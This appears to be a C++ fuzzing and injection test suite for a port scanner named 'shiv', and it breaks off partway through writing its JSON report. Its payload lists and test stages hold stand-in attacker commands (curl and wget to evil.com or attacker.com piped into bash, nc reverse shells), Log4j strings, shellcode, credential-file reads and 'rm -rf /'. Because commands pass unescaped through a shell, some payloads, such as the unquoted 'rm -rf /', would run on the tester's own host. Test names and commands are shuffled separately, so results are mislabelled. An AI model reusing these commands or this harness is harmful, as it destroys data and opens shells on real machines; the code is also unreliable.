// shiv_hardcore_tester.cpp
// Ultimate Vulnerability & Fuzzing Test Suite for SHIV Scanner

#include <iostream>
#include <string>
#include <vector>
#include <cstdlib>
#include <fstream>
#include <chrono>
#include <iomanip>
#include <regex>
#include <ctime>
#include <sys/stat.h>
#include <unistd.h>
#include <wait.h>
#include <signal.h>
#include <cstring>
#include <algorithm>
#include <random>
#include <sstream>
#include <thread>
#include <atomic>
#include <queue>
#include <mutex>

#define TARGET_IP "192.168.1.77"
#define SHIV_BINARY "./shiv"
#define LOG_DIR "test_logs"
#define COMMAND_TIMEOUT_SEC 60  // Exactly 60 seconds per command

class HardcoreShivTester {
private:
    std::string target_ip;
    std::string shiv_path;
    std::vector<std::string> test_commands;
    std::vector<std::string> command_names;
    int passed, failed, crashed;
    std::mutex log_mutex;
    
    struct DetailedResult {
        std::string command;
        std::string output;
        int exit_code;
        bool crashed;
        bool timeout;
        double duration;
        std::string error_type;
        std::string crash_signal;
        size_t output_size;
        bool memory_error;
    };
    
    std::vector<DetailedResult> all_results;
    
    void createLogDirectory() {
        mkdir(LOG_DIR, 0777);
        mkdir((std::string(LOG_DIR) + "/commands").c_str(), 0777);
        mkdir((std::string(LOG_DIR) + "/outputs").c_str(), 0777);
        mkdir((std::string(LOG_DIR) + "/crashes").c_str(), 0777);
    }
    
    // Generate random invalid values
    std::string randomInvalidPort() {
        std::vector<std::string> invalid_ports = {
            "-1", "0", "65536", "999999", "abc", "0xFFFF", "0xFFFFFFFF",
            "--exec", "; ls", "|| cat /etc/passwd", "`id`", "$(whoami)",
            "&", "|", ">", "<", "\"", "'", "\\", "/dev/null",
            "null", "undefined", "NaN", "INF", "-INF", "true", "false"
        };
        return invalid_ports[rand() % invalid_ports.size()];
    }
    
    std::string randomInvalidTTL() {
        std::vector<std::string> invalid_ttl = {
            "-1", "-255", "256", "1000", "999999", "0xFFFFFFFF",
            "abc", "--help", "; exit", "|| shutdown", "`reboot`",
            "NaN", "null", "undefined", "0xGG", "08", "09"
        };
        return invalid_ttl[rand() % invalid_ttl.size()];
    }
    
    std::string randomInvalidMTU() {
        std::vector<std::string> invalid_mtu = {
            "-1", "0", "21", "65536", "100000", "0xFFFFFFFF",
            "abc", "0xFFFF", "0xGG", "--invalid", "; rm -rf",
            "|| touch /tmp/pwned", "`whoami`", "$(id)"
        };
        return invalid_mtu[rand() % invalid_mtu.size()];
    }
    
    std::string randomInvalidDSCP() {
        std::vector<std::string> invalid_dscp = {
            "-1", "64", "255", "999", "0xFFFF", "ABCD", "EFGH",
            "; dnf install malware", "|| curl attacker.com/shell.sh",
            "`nc attacker 4444 -e /bin/bash`", "$(reboot)",
            "INJECTION", "PAYLOAD", "EXPLOIT"
        };
        return invalid_dscp[rand() % invalid_dscp.size()];
    }
    
    std::string randomInvalidWindowSize() {
        std::vector<std::string> invalid_win = {
            "-1", "-65535", "4294967296", "0xFFFFFFFFF", "abc",
            "; echo exploited", "|| cat /etc/shadow", "`id` > /tmp/pwned",
            "$(python3 -c 'print(\"A\"*1000)')", "99999999999999999999"
        };
        return invalid_win[rand() % invalid_win.size()];
    }
    
    std::string randomPayloadInjection() {
        std::vector<std::string> injections = {
            "';system('id');'", "\"; DROP TABLE users; --", "`nc -e /bin/bash attacker.com 4444`",
            "$(curl http://evil.com/backdoor.sh | bash)", "${IFS}evil${IFS}command",
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
            std::string(4096, 'A'),  // Buffer overflow attempt
            std::string(8192, 'B'),  // Large buffer
            "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90",  // NOP sled
            "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",  // Shellcode
            "%x%x%x%x%x%x%x%x%x%x",  // Format string
            "%p%p%p%p%p%p%p%p%p%p",  // Pointer leak
            "${jndi:ldap://attacker.com/exploit}",  // Log4j attempt
            "<?php system($_GET['cmd']); ?>",  // PHP injection
            "<script>alert('XSS')</script>",  // XSS attempt
            "../../../etc/passwd",  // Path traversal
            "|| echo exploited >> /etc/passwd",  // Command injection
            "; wget http://evil.com/backdoor -O /tmp/backdoor && chmod +x /tmp/backdoor && /tmp/backdoor"
        };
        return injections[rand() % injections.size()];
    }
    
    std::string randomIPAddress() {
        std::vector<std::string> ips = {
            "0.0.0.0", "255.255.255.255", "127.0.0.1", "192.168.1.256",
            "999.999.999.999", "google.com", "; ls", "|| cat /etc/passwd",
            "`whoami`@evil.com", "$(id)", "localhost", "0x7F000001",
            "2130706433", "0177.0000.0000.0001", "127.0.0.1/33",
            "192.168.1.1/0", "0.0.0.0/0", "::1", "fe80::1%eth0"
        };
        return ips[rand() % ips.size()];
    }
    
    bool runCommandWithPreciseTimeout(const std::string& cmd, std::string& output, int& exit_code, int timeout_sec) {
        std::string full_cmd = "timeout -k 5 " + std::to_string(timeout_sec) + " " + cmd + " 2>&1";
        
        auto start = std::chrono::steady_clock::now();
        
        FILE* pipe = popen(full_cmd.c_str(), "r");
        if (!pipe) return false;
        
        char buffer[65536];
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            output += buffer;
        }
        
        auto end = std::chrono::steady_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();
        
        int ret = pclose(pipe);
        
        if (WIFEXITED(ret)) {
            exit_code = WEXITSTATUS(ret);
            return duration >= (timeout_sec * 1000 - 100) && duration <= (timeout_sec * 1000 + 500);
        } else if (WIFSIGNALED(ret)) {
            exit_code = -WTERMSIG(ret);
            return false;
        }
        
        return false;
    }
    
    void testCommand(const std::string& test_name, const std::string& options) {
        std::string full_command = shiv_path + " " + target_ip + " " + options;
        
        std::lock_guard<std::mutex> lock(log_mutex);
        
        std::cout << "\n🔍 [" << std::setw(3) << (test_commands.size() > 0 ? 
                  std::to_string(test_commands.size()) : "?") << "] Testing: " << test_name << std::endl;
        std::cout << "   📝 Command: " << full_command.substr(0, 120) << (full_command.length() > 120 ? "..." : "") << std::endl;
        
        DetailedResult result;
        result.command = full_command;
        result.crashed = false;
        result.timeout = false;
        result.exit_code = 0;
        result.memory_error = false;
        
        auto start = std::chrono::high_resolution_clock::now();
        
        std::string output;
        int exit_code = 0;
        bool timed_out = runCommandWithPreciseTimeout(full_command, output, exit_code, COMMAND_TIMEOUT_SEC);
        
        auto end = std::chrono::high_resolution_clock::now();
        result.duration = std::chrono::duration<double>(end - start).count();
        result.output = output;
        result.output_size = output.length();
        result.exit_code = exit_code;
        
        // Enhanced error detection
        bool has_error = false;
        
        // Check for crashes
        if (output.find("Segmentation fault") != std::string::npos ||
            output.find("segmentation fault") != std::string::npos) {
            has_error = true;
            result.crashed = true;
            result.crash_signal = "SIGSEGV (Segmentation Fault)";
            crashed++;
        } else if (output.find("Aborted") != std::string::npos ||
                   output.find("aborted") != std::string::npos) {
            has_error = true;
            result.crashed = true;
            result.crash_signal = "SIGABRT (Aborted)";
            crashed++;
        } else if (output.find("Bus error") != std::string::npos) {
            has_error = true;
            result.crashed = true;
            result.crash_signal = "SIGBUS (Bus Error)";
            crashed++;
        } else if (output.find("Floating point exception") != std::string::npos) {
            has_error = true;
            result.crashed = true;
            result.crash_signal = "SIGFPE (Floating Point Exception)";
            crashed++;
        } else if (output.find("Illegal instruction") != std::string::npos) {
            has_error = true;
            result.crashed = true;
            result.crash_signal = "SIGILL (Illegal Instruction)";
            crashed++;
        } else if (output.find("Killed") != std::string::npos) {
            has_error = true;
            result.crashed = true;
            result.crash_signal = "SIGKILL (Killed - OOM Killer?)";
            crashed++;
            result.memory_error = true;
        }
        
        // Check for memory errors
        if (output.find("malloc") != std::string::npos && 
            (output.find("corruption") != std::string::npos || output.find("error") != std::string::npos)) {
            result.memory_error = true;
            has_error = true;
            result.error_type = "HEAP_CORRUPTION";
        }
        
        if (output.find("stack") != std::string::npos && output.find("overflow") != std::string::npos) {
            result.memory_error = true;
            has_error = true;
            result.error_type = "STACK_OVERFLOW";
        }
        
        if (output.find("double free") != std::string::npos) {
            result.memory_error = true;
            has_error = true;
            result.error_type = "DOUBLE_FREE";
        }
        
        if (output.find("use after free") != std::string::npos) {
            result.memory_error = true;
            has_error = true;
            result.error_type = "USE_AFTER_FREE";
        }
        
        // Check for command injection success
        if (output.find("uid=") != std::string::npos ||
            output.find("root") != std::string::npos ||
            output.find("/etc/passwd") != std::string::npos) {
            has_error = true;
            result.error_type = "COMMAND_INJECTION_SUCCESS";
        }
        
        // Check for timeout
        if (exit_code == 124 || exit_code == 137 || result.duration >= COMMAND_TIMEOUT_SEC - 1) {
            result.timeout = true;
            has_error = true;
            result.error_type = "TIMEOUT";
        }
        
        // Check exit code for errors
        if (exit_code != 0 && exit_code != 124 && !result.crashed) {
            has_error = true;
            result.error_type = "EXIT_CODE_" + std::to_string(exit_code);
        }
        
        // Save results
        if (has_error || result.crashed) {
            std::cout << "   ❌ FAILED: ";
            if (result.crashed) std::cout << "💥 CRASH - " << result.crash_signal;
            else if (result.timeout) std::cout << "⏰ TIMEOUT (exceeded " << COMMAND_TIMEOUT_SEC << "s)";
            else if (result.memory_error) std::cout << "🧠 MEMORY ERROR - " << result.error_type;
            else if (!result.error_type.empty()) std::cout << "⚠️  ERROR - " << result.error_type;
            else std::cout << "❌ UNKNOWN ERROR";
            std::cout << std::endl;
            
            failed++;
            
            // Save crash/error details
            std::string log_filename = LOG_DIR "/crashes/" + 
                std::regex_replace(test_name, std::regex("[^a-zA-Z0-9_-]"), "_") + "_" +
                std::to_string(std::chrono::system_clock::now().time_since_epoch().count()) + ".log";
            
            std::ofstream log(log_filename);
            log << "=== CRASH/ERROR REPORT ===\n";
            log << "Test: " << test_name << "\n";
            log << "Command: " << full_command << "\n";
            log << "Exit Code: " << exit_code << "\n";
            log << "Duration: " << std::fixed << std::setprecision(3) << result.duration << "s\n";
            log << "Crashed: " << (result.crashed ? "YES" : "NO") << "\n";
            log << "Crash Signal: " << result.crash_signal << "\n";
            log << "Memory Error: " << (result.memory_error ? "YES" : "NO") << "\n";
            log << "Error Type: " << result.error_type << "\n";
            log << "\n=== COMMAND OUTPUT ===\n";
            log << output << "\n";
            log << "=== END OF OUTPUT ===\n";
            log.close();
        } else {
            std::cout << "   ✅ PASSED (" << std::fixed << std::setprecision(2) << result.duration << "s)" << std::endl;
            passed++;
        }
        
        // Always save full output for analysis
        std::ofstream out_log(LOG_DIR "/outputs/" + 
            std::regex_replace(test_name, std::regex("[^a-zA-Z0-9_-]"), "_") + ".log");
        out_log << "=== COMMAND ===\n" << full_command << "\n\n";
        out_log << "=== EXIT CODE ===\n" << exit_code << "\n\n";
        out_log << "=== DURATION ===\n" << result.duration << "s\n\n";
        out_log << "=== OUTPUT ===\n" << output << "\n";
        out_log.close();
        
        // Save command for reproduction
        std::ofstream cmd_log(LOG_DIR "/commands/" + 
            std::regex_replace(test_name, std::regex("[^a-zA-Z0-9_-]"), "_") + ".sh");
        cmd_log << "#!/bin/bash\n";
        cmd_log << "# Test: " << test_name << "\n";
        cmd_log << "# Timeout: " << COMMAND_TIMEOUT_SEC << " seconds\n";
        cmd_log << full_command << "\n";
        cmd_log.close();
        
        all_results.push_back(result);
    }
    
    void generateExoticCombinations() {
        std::cout << "Generating exotic test combinations..." << std::endl;
        
        // Stage 1: Basic scan modes (6 tests)
        std::vector<std::pair<std::string, std::string>> stages[] = {
            // Stage 1: Basic scans
            {
                {"SYN_Scan_Basic", "-p 80 -sS"},
                {"FIN_Scan_Basic", "-p 80 -sF"},
                {"ACK_Scan_Basic", "-p 80 -sA"},
                {"NULL_Scan_Basic", "-p 80 -sN"},
                {"XMAS_Scan_Basic", "-p 80 -sX"},
                {"WINDOW_Scan_Basic", "-p 80 -sW"},
                {"MAIMON_Scan_Basic", "-p 80 -sM"},
                {"CWR_Scan_Basic", "-p 80 -sCW"},
                {"ECE_Scan_Basic", "-p 80 -sE"},
                {"URG_Scan_Basic", "-p 80 -sUG"},
                {"PSH_Scan_Basic", "-p 80 -sPH"}
            },
            // Stage 2: Exotic scan modes
            {
                {"HANUMAN_Exotic", "-p 80 -sH"},
                {"KAKABHUSUNDI_Exotic", "-p 80 -sK"},
                {"GANESH_Exotic", "-p 80 -sG"},
                {"RAM_Exotic", "-p 80 -sR"},
                {"GARUD_Exotic", "-p 80 -sD"},
                {"JATAYU_Exotic", "-p 80 -sJ"}
            },
            // Stage 3: DSCP/TOS with invalid values
            {
                {"DSCP_EF_Valid", "-p 80 --dscp EF"},
                {"DSCP_AF41_Valid", "-p 80 --dscp AF41"},
                {"DSCP_CS5_Valid", "-p 80 --dscp CS5"},
                {"DSCP_Invalid_Negative", "-p 80 --dscp -1"},
                {"DSCP_Invalid_OOB", "-p 80 --dscp 999"},
                {"DSCP_Invalid_Hex", "-p 80 --dscp 0xGG"},
                {"DSCP_Injection", "-p 80 --dscp \"; ls\""},
                {"DSCP_BufferOverflow", "-p 80 --dscp " + std::string(10000, 'A')},
                {"TOS_Valid_Hex", "-p 80 --ip-tos 0xB8"},
                {"TOS_Invalid_Hex", "-p 80 --ip-tos 0xFFFFFFFF"},
                {"TOS_Invalid_String", "-p 80 --ip-tos INJECTION"},
                {"TOS_ECN_All", "-p 80 --ip-tos 0xBB"}
            },
            // Stage 4: Fragmentation attacks
            {
                {"Frag_Small_Valid", "-p 80 -f 8"},
                {"Frag_Invalid_Size", "-p 80 -f 1"},
                {"Frag_TooLarge", "-p 80 -f 70000"},
                {"Frag_Negative", "-p 80 -f -100"},
                {"Frag_OutOfOrder", "-p 80 --frag ofo"},
                {"Frag_ZeroOffsetLast", "-p 80 --frag zof"},
                {"Frag_Overlap", "-p 80 --frag lap"},
                {"Frag_All_Combined", "-p 80 -f 100 --frag ofo --frag zof --frag lap"},
                {"Frag_BufferOverflow", "-p 80 -f " + std::string(100000, '9')}
            },
            // Stage 5: MTU extremes
            {
                {"MTU_Minimum", "-p 80 --mtu 22"},
                {"MTU_Maximum", "-p 80 --mtu 65535"},
                {"MTU_Invalid_Low", "-p 80 --mtu 0"},
                {"MTU_Invalid_High", "-p 80 --mtu 999999"},
                {"MTU_Negative", "-p 80 --mtu -100"},
                {"MTU_StringInjection", "-p 80 --mtu abc"},
                {"MTU_CommandInjection", "-p 80 --mtu \"; rm -rf /\""}
            },
            // Stage 6: IP ID manipulation
            {
                {"IPID_Random", "-p 80 --ip-id random"},
                {"IPID_Sequential", "-p 80 --ip-id sequential"},
                {"IPID_Zero", "-p 80 --ip-id zero"},
                {"IPID_Constant", "-p 80 --ip-id constant --ip-id 0xDEAD"},
                {"IPID_Invalid_Mode", "-p 80 --ip-id fake_mode"},
                {"IPID_Overflow", "-p 80 --ip-id constant --ip-id 0xFFFFFFFFFFFFFFFF"}
            },
            // Stage 7: TTL manipulation attacks
            {
                {"TTL_1", "-p 80 --ttl 1"},
                {"TTL_255", "-p 80 --ttl 255"},
                {"TTL_0_Invalid", "-p 80 --ttl 0"},
                {"TTL_Negative", "-p 80 --ttl -5"},
                {"TTL_Overflow", "-p 80 --ttl 999999"},
                {"TTL_HexInjection", "-p 80 --ttl 0xGG"},
                {"TTL_CommandInjection", "-p 80 --ttl \"; cat /etc/passwd\""}
            },
            // Stage 8: Source port attacks
            {
                {"Sport_Valid", "-p 80 -g 12345"},
                {"Sport_Zero", "-p 80 -g 0"},
                {"Sport_Max", "-p 80 -g 65535"},
                {"Sport_Invalid", "-p 80 -g 65536"},
                {"Sport_Negative", "-p 80 -g -1"},
                {"Sport_Range_Valid", "-p 80 --sport-range 1000-2000"},
                {"Sport_Range_Invalid", "-p 80 --sport-range 5000-1000"},
                {"Sport_Range_Overflow", "-p 80 --sport-range 1-999999"},
                {"Sport_Injection", "-p 80 -g \"; nc evil.com 4444\""}
            },
            // Stage 9: Bad checksum attacks
            {
                {"BadSum_Auto", "-p 80 --badsum"},
                {"BadSum_Custom", "-p 80 --badsum 0xffff"},
                {"BadSum_Zero", "-p 80 --badsum 0x0000"},
                {"BadSum_Invalid", "-p 80 --badsum 0xGGGG"},
                {"BadSum_Overflow", "-p 80 --badsum 0xFFFFFFFF"},
                {"PrSum_Incremental", "-p 80 --prsum incremental"},
                {"PrSum_Pattern", "-p 80 --prsum pattern"},
                {"PrSum_AllModes", "-p 80 --prsum incremental --prsum pattern --prsum rfc1141"},
                {"PrSum_Invalid", "-p 80 --prsum fake_mode"}
            },
            // Stage 10: Payload attacks
            {
                {"Payload_String", "-p 80 --data \"HELLO\""},
                {"Payload_Hex", "-p 80 --data \"0xDEADBEEF\""},
                {"Payload_Large_1KB", "-p 80 --data-length 1024"},
                {"Payload_Large_64KB", "-p 80 --data-length 65535"},
                {"Payload_Maximum", "-p 80 --data-length 1000000"},
                {"Payload_Shellcode", "-p 80 --data \"" + randomPayloadInjection() + "\""},
                {"Payload_BufferOverflow", "-p 80 --data " + std::string(100000, 'A')},
                {"Payload_FormatString", "-p 80 --data \"%x%x%x%x%x%x%x%x%x%x\""},
                {"Payload_NullBytes", "-p 80 --data \"\\x00\\x00\\x00\\x00\""}
            },
            // Stage 11: Packet length manipulation (evasion)
            {
                {"PktLen_SmallLie", "-p 80 --packet-length small"},
                {"PktLen_SmallTrunc60", "-p 80 --packet-length small:60"},
                {"PktLen_SmallTrunc42", "-p 80 --packet-length small:42"},
                {"PktLen_SmallTrunc20", "-p 80 --packet-length small:20"},
                {"PktLen_BigLie", "-p 80 --packet-length big"},
                {"PktLen_BigPad", "-p 80 --packet-length big:3000"},
                {"PktLen_Exact", "-p 80 --packet-length exact:1500"},
                {"PktLen_ClaimedLie", "-p 80 --packet-length claimed:65535"},
                {"PktLen_InvalidMode", "-p 80 --packet-length fake"},
                {"PktLen_Combined", "-p 80 --packet-length small --packet-length big:2000"}
            },
            // Stage 12: TFO Cookie injection attacks
            {
                {"TFO_Valid_Odd", "-p 80 --inj-tfo-cookie len:5"},
                {"TFO_Valid_String", "-p 80 --inj-tfo-cookie str:abc"},
                {"TFO_Valid_Hex", "-p 80 --inj-tfo-cookie hex:DEAD"},
                {"TFO_Even_Confusion", "-p 80 --inj-tfo-cookie len:2"},
                {"TFO_Large_Cookie", "-p 80 --inj-tfo-cookie len:999"},
                {"TFO_Maximum", "-p 80 --inj-tfo-cookie len:65535"},
                {"TFO_Injection", "-p 80 --inj-tfo-cookie str:\"; ls /root\""},
                {"TFO_HexInjection", "-p 80 --inj-tfo-cookie hex:DEADBEEF; rm -rf /"}
            },
            // Stage 13: TCP options extremes
            {
                {"WS_Valid", "-p 80 --ws 7"},
                {"WS_Max", "-p 80 --ws 500"},
                {"WS_Negative", "-p 80 --ws -1"},
                {"WS_Overflow", "-p 80 --ws 999999"},
                {"MSS_Valid", "-p 80 --mss 1460"},
                {"MSS_Min", "-p 80 --mss 0"},
                {"MSS_Max", "-p 80 --mss 66666"},
                {"MSS_Invalid", "-p 80 --mss -100"},
                {"Win_Valid", "-p 80 --win-size 65535"},
                {"Win_Zero", "-p 80 --win-size 0"},
                {"Win_Negative", "-p 80 --win-size -1"},
                {"Win_Overflow", "-p 80 --win-size 0xFFFFFFFF"},
                {"SeqNum_Random", "-p 80 --seq-num 123456789"},
                {"SeqNum_Zero", "-p 80 --seq-num 0"},
                {"SeqNum_Max", "-p 80 --seq-num 4294967295"},
                {"SeqNum_Negative", "-p 80 --seq-num -1"},
                {"Timestamp_Valid", "-p 80 -t 1234567"},
                {"Timestamp_Zero", "-p 80 -t 0"},
                {"Timestamp_Max", "-p 80 -t 100000000"},
                {"Timestamp_Overflow", "-p 80 -t 9999999999"},
                {"NOPs_Many", "-p 80 --nops 100"},
                {"NOPs_Invalid", "-p 80 --nops -5"},
                {"SACK_Off", "-p 80 --sack off"}
            },
            // Stage 14: Debug and performance options
            {
                {"Debug_Packet", "-p 80 --debug packet"},
                {"Debug_RTT", "-p 80 --debug rtt"},
                {"Debug_WSN", "-p 80 --debug wsn"},
                {"Debug_TLL", "-p 80 --debug tll"},
                {"Debug_All", "-p 80 --debug packet --debug rtt --debug wsn --debug tll"},
                {"Debug_Invalid", "-p 80 --debug fake"},
                {"RCVBuf_Small", "-p 80 --rcvbuf 128k"},
                {"RCVBuf_Large", "-p 80 --rcvbuf 1g"},
                {"RCVBuf_Invalid", "-p 80 --rcvbuf -1"},
                {"SendUring_Valid", "-p 80 --send-uring 256"},
                {"SendUring_Max", "-p 80 --send-uring 4096"},
                {"SendUring_Invalid", "-p 80 --send-uring 0"},
                {"RCVUring_Valid", "-p 80 --rcv-uring 256"},
                {"SendUring_Overflow", "-p 80 --send-uring 999999"}
            },
            // Stage 15: Rate control and timing attacks
            {
                {"SetRTT_Valid", "-p 80 --set-rtt 150ms"},
                {"SetRTT_Zero", "-p 80 --set-rtt 0ms"},
                {"SetRTT_Max", "-p 80 --set-rtt 10s"},
                {"Rate_Valid", "-p 80 --rate 500ms:100-200"},
                {"Rate_Invalid", "-p 80 --rate 0ms:0-0"},
                {"Rate_Exploit", "-p 80 --rate \"0ms:999999-9999999\""},
                {"Jitter_Valid", "-p 80 --jitter 10ms"},
                {"Jitter_Zero", "-p 80 --jitter 0ms"},
                {"Jitter_Overflow", "-p 80 --jitter 9999s"},
                {"BatchDelay_Valid", "-p 80 --batch-delay 50ms"},
                {"BatchDelay_Range", "-p 80 --batch-delay 20ms-100ms"},
                {"PortTimeout_Tiny", "-p 80 --port-timeout 1ms-5ms"},
                {"PortTimeout_Zero", "-p 80 --port-timeout 0ms-0ms"},
                {"Timeout_Infinite", "-p 80 --timeout 0ms"},
                {"Timeout_Extreme", "-p 80 --timeout 10000ms"}
            },
            // Stage 16: Multi-port scans with extreme ranges
            {
                {"SinglePort", "-p 80 -sS"},
                {"MultiPorts", "-p 22,80,443,8080,8443 -sS"},
                {"PortRange_Small", "-p 1-100 -sS"},
                {"PortRange_Large", "-p 1-10000 -sS"},
                {"PortRange_Full", "-p 1-65535 -sS"},
                {"PortRange_Invalid", "-p 1000-1 -sS"},
                {"PortRange_Overflow", "-p 1-999999 -sS"},
                {"ExcludePorts", "-p 1-1000 --exclude-ports 80,443"},
                {"ExcludePorts_Range", "-p 1-1000 --exclude-ports 500-600"}
            },
            // Stage 17: Mixed realistic scans
            {
                {"Mix_WebServer", "-p 80,443 -sS --dscp EF --ttl 64 --ws 7 --mss 1460"},
                {"Mix_FirewallBypass", "-p 1-1000 -sA --ip-tos 0xB8 -f 500 --badsum"},
                {"Mix_IDS_Evasion", "-p 22,80,443 -sX --mtu 1400 --ip-id sequential --frag ofo"},
                {"Mix_DNS_Scan", "-p 53 -sN --badsum --data-length 64 --packet-length small"},
                {"Mix_Stealth", "-p 8080 -sF --packet-length small --ws 14 --jitter 5ms"},
                {"Mix_Performance", "-p 1-10000 -sS --rate 100ms:50-100 --batch-delay 10ms"},
                {"Mix_Debug", "-p 80,443 -sS --debug packet --debug rtt --set-rtt 50ms"}
            },
            // Stage 18: Exotic extreme combinations
            {
                {"Exotic_AllFlags", "-p 80 -sS -sA -sX -sN -sF -sW -sM -sUG -sPH -sH -sK -sG -sR -sD -sJ"},
                {"Exotic_AllDSCP", "-p 80 --dscp EF --dscp AF41 --dscp CS5 --ip-tos 0xB8 --ip-tos 0x88"},
                {"Exotic_AllFrag", "-p 80 -f 8 -f 1000 --frag ofo --frag zof --frag lap"},
                {"Exotic_MaxMTU", "-p 80 --mtu 65535 -f 65528 --packet-length big:65535"},
                {"Exotic_TinyTTL", "-p 80 --ttl 1 -g 0 --sport-range 1-1 --badsum 0x0000"},
                {"Exotic_HugePayload", "-p 80 --data-length 65535 --packet-length claimed:65535"},
                {"Exotic_BufferOverflow", "-p 80 --data " + std::string(50000, 'A') + " --ws 9999 --mss 99999"},
                {"Exotic_AllTCPOptions", "-p 80 --ws 500 --mss 65535 --win-size 0 --seq-num 0 -t 0 --nops 100 --sack off"},
                {"Exotic_MaxRate", "-p 1-1000 --rate 1ms:1-10000 --jitter 0ms --batch-delay 0ms"},
                {"Exotic_PortRange_All", "-p 1-65535 --sport-range 1-65535 --ttl 1 --badsum 0x0000"}
            },
            // Stage 19: Command injection and exploitation attempts
            {
                {"Inject_ShellCmd", "-p 80 --dscp \"; /bin/bash -c 'echo exploited'\" --ttl \"\\$(id)\""},
                {"Inject_ReverseShell", "-p 80 --data \"`nc -e /bin/bash attacker.com 4444`\" --ip-id \"; curl http://evil.com/backdoor.sh\""},
                {"Inject_FileWrite", "-p 80 --mtu \"|| echo 'pwned' > /tmp/vuln\" --ws \"; chmod 777 /etc/passwd\""},
                {"Inject_FormatString", "-p 80 --data \"%p%p%p%p%p%p%p%p%p%p\" --seq-num \"%n%n%n%n\""},
                {"Inject_HeapSpray", "-p 80 --data \"" + std::string(10000, '\x90') + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\""},
                {"Inject_Log4j", "-p 80 --data \"${jndi:ldap://attacker.com/exploit}\" --ws \"${jndi:rmi://evil.com/exploit}\""},
                {"Inject_SQL_Injection", "-p 80 --data \"' OR '1'='1' -- \" --ttl \"'; DROP TABLE users; --\""}
            },
            // Stage 20: Resource exhaustion attacks
            {
                {"Resource_LargeBatch", "-p 1-65535 -b 10000 --send-uring 4096 --rcv-uring 4096"},
                {"Resource_NoTimeout", "-p 1-1000 --timeout 999999ms --port-timeout 99999ms-999999ms"},
                {"Resource_InfiniteLoop", "-p 80 --rate 0ms:1-1 --jitter 0ms --batch-delay 0ms --debug all"},
                {"Resource_Memory", "-p 1-10000 --data-length 1000000 --rcvbuf 10g --send-uring 99999"},
                {"Resource_Network", "-p 1-1000 -f 1 --frag ofo --frag zof --frag lap --packet-length small --packet-length big"}
            }
        };
        
        for (const auto& stage : stages) {
            for (const auto& test : stage) {
                command_names.push_back(test.first);
                test_commands.push_back(test.second);
            }
        }
        
        // Shuffle to ensure random order (optional)
        std::random_device rd;
        std::mt19937 g(rd());
        std::shuffle(test_commands.begin(), test_commands.end(), g);
        std::shuffle(command_names.begin(), command_names.end(), g);
    }
    
public:
    HardcoreShivTester(const std::string& target = TARGET_IP, const std::string& binary = SHIV_BINARY) 
        : target_ip(target), shiv_path(binary), passed(0), failed(0), crashed(0) {
        createLogDirectory();
        generateExoticCombinations();
    }
    
    void runAllTests() {
        std::cout << "\n🔥 SHIV SCANNER HARDCORE VULNERABILITY TEST SUITE 🔥\n";
        std::cout << "=====================================================\n";
        std::cout << "🎯 Target: " << target_ip << "\n";
        std::cout << "🔧 Binary: " << shiv_path << "\n";
        std::cout << "📊 Total Tests: " << test_commands.size() << "\n";
        std::cout << "⏱️  Timeout per test: " << COMMAND_TIMEOUT_SEC << " seconds (exact)\n";
        std::cout << "🧪 Testing Strategy: Fuzzing, Injection, Edge Cases\n";
        std::cout << "=====================================================\n\n";
        
        auto start_time = std::chrono::high_resolution_clock::now();
        
        for (size_t i = 0; i < test_commands.size(); i++) {
            testCommand(command_names[i], test_commands[i]);
            
            // Progress indicator
            float progress = (float)(i + 1) / test_commands.size() * 100;
            std::cout << "📈 Progress: " << std::fixed << std::setprecision(1) << progress 
                      << "% (" << (i + 1) << "/" << test_commands.size() << ")\n";
        }
        
        auto end_time = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration<double>(end_time - start_time);
        
        // Final summary
        std::cout << "\n\n" << std::string(60, '=') << std::endl;
        std::cout << "📊 FINAL TEST SUMMARY" << std::endl;
        std::cout << std::string(60, '=') << std::endl;
        std::cout << "Total tests executed:     " << test_commands.size() << std::endl;
        std::cout << "✅ Passed:                " << passed << std::endl;
        std::cout << "❌ Failed/Errors:         " << failed << std::endl;
        std::cout << "💥 Crashes:               " << crashed << std::endl;
        std::cout << "📈 Success rate:          " << std::fixed << std::setprecision(2) 
                  << (float)passed / test_commands.size() * 100 << "%" << std::endl;
        std::cout << "⏱️  Total time:            " << std::fixed << std::setprecision(2) 
                  << duration.count() << " seconds" << std::endl;
        std::cout << "⏱️  Estimated real time:   " << std::fixed << std::setprecision(0) 
                  << (test_commands.size() * COMMAND_TIMEOUT_SEC / 60.0) << " minutes" << std::endl;
        std::cout << std::string(60, '=') << std::endl;
        
        // Vulnerability summary
        std::cout << "\n🔴 VULNERABILITY ASSESSMENT:\n";
        std::cout << std::string(60, '-') << std::endl;
        
        if (crashed > 0) {
            std::cout << "⚠️  CRITICAL: " << crashed << " crashes detected!" << std::endl;
            std::cout << "   - Likely memory corruption vulnerabilities" << std::endl;
            std::cout << "   - Possible buffer overflows or use-after-free" << std::endl;
        }
        
        if (failed > crashed) {
            std::cout << "⚠️  HIGH: " << (failed - crashed) << " non-crash errors detected" << std::endl;
            std::cout << "   - Potential logic bugs or resource leaks" << std::endl;
        }
        
        if (passed == test_commands.size()) {
            std::cout << "✅ EXCELLENT: No vulnerabilities detected!" << std::endl;
            std::cout << "   - The scanner appears robust against all tested attacks" << std::endl;
        }
        
        std::cout << "\n📁 Detailed logs saved to: " << LOG_DIR << "/" << std::endl;
        std::cout << "   - Crashes: " << LOG_DIR << "/crashes/" << std::endl;
        std::cout << "   - Outputs: " << LOG_DIR << "/outputs/" << std::endl;
        std::cout << "   - Commands: " << LOG_DIR << "/commands/" << std::endl;
        std::cout << "\n🔧 To reproduce a crash: bash " << LOG_DIR << "/commands/<test_name>.sh\n";
        std::cout << std::string(60, '=') << std::endl;
        
        // Generate JSON report
        generateJSONReport();
    }
    
    void generateJSONReport() {
        std::ofstream json(LOG_DIR "/vulnerability_report.json");
        json << "{\n";
        json << "  \"test_info\": {\n";
        json << "    \"target\": \"" << target_ip << "\",\n";
        json << "    \"binary\": \"" << shiv_path << "\",\n";
